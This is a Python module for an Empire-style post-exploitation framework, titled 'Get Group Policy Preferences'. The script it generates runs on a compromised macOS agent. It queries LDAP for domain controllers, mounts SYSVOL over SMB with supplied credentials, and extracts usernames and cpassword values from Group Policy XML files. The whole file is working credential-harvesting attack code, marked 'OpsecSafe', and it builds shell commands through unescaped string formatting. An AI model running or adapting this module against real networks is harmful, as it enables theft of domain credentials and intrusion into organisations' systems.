from builtins import object
class Module(object):

    def __init__(self, mainMenu, params=[]):

        # metadata info about the module, not modified during runtime
        self.info = {
            # name for the module that will appear in module menus
            'Name': 'Get Group Policy Preferences',

            # list of one or more authors for the module
            'Author': ['@424f424f'],

            # more verbose multi-line description of the module
            'Description': 'This module will attempt to pull group policy preference passwords from SYSVOL',

            # True if the module needs to run in the background
            'Background' : False,

            # File extension to save the file as
            'OutputExtension' : "",

            # if the module needs administrative privileges
            'NeedsAdmin' : False,

            # True if the method doesn't touch disk/is reasonably opsec safe
            'OpsecSafe' : True,

            # the module language
            'Language' : 'python',

            # the minimum language version needed
            'MinLanguageVersion' : '2.6',

            # list of any references/other comments
            'Comments': ['']
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'Agent to run on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'LDAPAddress' : {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'LDAP IP/Hostname',
                'Required'      :   True,
                'Value'         :   ''
            },
            'BindDN' : {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'user@penlab.local',
                'Required'      :   True,
                'Value'         :   ''
            },
            'password' : {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'Password to connect to LDAP',
                'Required'      :   False,
                'Value'         :   ''
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        # During instantiation, any settable option parameters
        #   are passed as an object set to the module and the
        #   options dictionary is automatically set. This is mostly
        #   in case options are passed on the command line
        if params:
            for param in params:
                # parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value

    def generate(self):

        LDAPAddress = self.options['LDAPAddress']['Value']
        BindDN = self.options['BindDN']['Value']
        password = self.options['password']['Value']

        # the Python script itself, with the command to invoke
        #   for execution appended to the end. Scripts should output
        #   everything to the pipeline for proper parsing.
        #
        # the script should be stripped of comments, with a link to any
        #   original reference script included in the comments.
        script = """
import sys, os, subprocess, re

BindDN = "%s"
LDAPAddress = "%s"
password = "%s"
password.replace('!','%%21')
password.replace('#','%%23')
password.replace('$','%%24')

regex = re.compile('.+@([^.]+)\..+')
global tld
match = re.match(regex, BindDN)
tld = match.group(1)
global ext
global name
name = BindDN.split('@')[0]
ext = BindDN.split('.')[1]


cmd = \"""ldapsearch -x -h {} -b "dc={},dc={}" -D {} -w {} "(&(objectcategory=Computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))" ""\".format(LDAPAddress, tld, ext, BindDN, password)
output = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
output2 = subprocess.Popen(["grep", "name:"],stdin=output.stdout, stdout=subprocess.PIPE,universal_newlines=True)
output.stdout.close()
out,err = output2.communicate()


print subprocess.Popen('mkdir /Volumes/sysvol', shell=True, stdout=subprocess.PIPE).stdout.read()

cmd = \"""mount_smbfs //'{};{}:{}'@{}/SYSVOL /Volumes/sysvol""\".format(ext,name,password,LDAPAddress)
print subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE).stdout.read()
print "Searching for Passwords...This may take some time"
xmls = subprocess.Popen('find /Volumes/sysvol -name *.xml', shell=True, stdout=subprocess.PIPE).stdout.read()
cmd1 = \"""cat {}""\".format(xmls)
result = subprocess.Popen(cmd1, shell=True, stdout=subprocess.PIPE).stdout.read()
print ""
for usermatch in re.finditer(r'userName="(.*?)"|newName="(.*?)"|cpassword="(.*?)"', result, re.DOTALL):
    print usermatch.group(0)



print ""
print subprocess.Popen('diskutil unmount force /Volumes/sysvol/', shell=True, stdout=subprocess.PIPE).stdout.read()
print ""
print "Finished"




""" % (BindDN, LDAPAddress, password)
        return script
